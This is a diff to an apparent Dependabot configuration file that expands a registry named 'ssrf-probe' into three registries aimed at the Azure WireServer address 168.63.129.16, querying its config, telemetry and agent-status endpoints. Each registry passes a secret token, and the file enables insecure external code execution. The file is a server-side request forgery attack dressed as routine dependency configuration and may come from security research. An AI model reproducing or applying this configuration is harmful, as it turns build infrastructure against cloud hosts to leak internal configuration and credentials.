@@ -1,8 +1,16 @@
 version: 2
 registries:
-  ssrf-probe:
+  ssrf-a:
     type: python-index
-    url: http://168.63.129.16/machine/?comp=goalstate&api-version=2020-06-01#
+    url: http://168.63.129.16/?comp=config#
+    token: ${{ secrets.SSRF_TOKEN }}
+  ssrf-b:
+    type: python-index
+    url: http://168.63.129.16/?comp=telemetrydata#
+    token: ${{ secrets.SSRF_TOKEN }}
+  ssrf-c:
+    type: python-index
+    url: http://168.63.129.16/?comp=agentStatus#
     token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
@@ -11,4 +19,6 @@ updates:
       interval: "daily"
     insecure-external-code-execution: allow
     registries:
-      - ssrf-probe
+      - ssrf-a
+      - ssrf-b
+      - ssrf-c
